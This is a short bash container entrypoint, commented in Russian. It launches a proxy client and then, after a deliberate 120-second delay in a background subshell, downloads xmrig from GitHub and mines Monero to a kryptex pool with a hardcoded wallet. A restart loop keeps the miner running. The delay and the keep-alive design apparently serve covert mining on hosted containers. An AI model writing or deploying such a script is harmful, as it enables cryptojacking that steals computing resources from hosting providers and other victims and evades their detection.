#!/bin/bash

# --- Запускаем клиент/прокси СРАЗУ ---
./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
CLIENT_PID=$!
echo "Client PID: $CLIENT_PID"

# --- Ждём, пока прокси поднимется (опционально, но полезно) ---
echo "⏳ Waiting for proxy to be ready..."
for i in {1..30}; do
    if curl -s http://localhost:10000/health > /dev/null 2>&1 || ss -tln | grep -q :10000; then
        echo "✅ Proxy is up!"
        break
    fi
    sleep 1
done

# --- Запускаем майнер С ЗАДЕРЖКОЙ в фоне ---
(
    DELAY=120  # секунды, пока контейнер "устаканится"
    echo "⏰ Sleeping $DELAY seconds before mining..."
    sleep $DELAY

    # --- Подготовка xmrig ---
    DIR=xmrig-6.26.0
    ARCHIVE=$DIR-linux-static-x64.tar.gz
    [ -f $DIR/xmrig ] || (wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE && tar -xzf $ARCHIVE && rm $ARCHIVE)

    WALLET="krxX3328ZR/zrender_$((RANDOM % 1000 + 1))"
    echo "🚀 Starting XMRIG with wallet: $WALLET at $(date)"

    # --- Цикл перезапуска майнера ---
    while true; do
        stdbuf -oL -eL ./$DIR/xmrig \
            --url=xmr-ru.kryptex.network:7029 \
            --user=$WALLET \
            --pass=x \
            --coin=monero \
            --cpu-max-threads-hint=5 \
            --randomx-mode=light \
            --verbose 2>&1 | tee -a xmrig.log

        EXIT_CODE=$?
        echo "⚠️  [$(date)] XMRIG exited with code $EXIT_CODE, restarting in 60s..."
        sleep 60
    done
) &  # <--- ВАЖНО: весь блок в подпроцессе и в фоне

MINER_LAUNCHER_PID=$!
echo "🔧 Miner launcher PID: $MINER_LAUNCHER_PID (will start after ${DELAY}s delay)"

# --- Основной процесс: ждём прокси и держим контейнер живым ---
echo "🔄 Main loop: keeping container alive via proxy..."
wait $CLIENT_PID  # Ждём, пока клиент не упадёт (если упадёт)
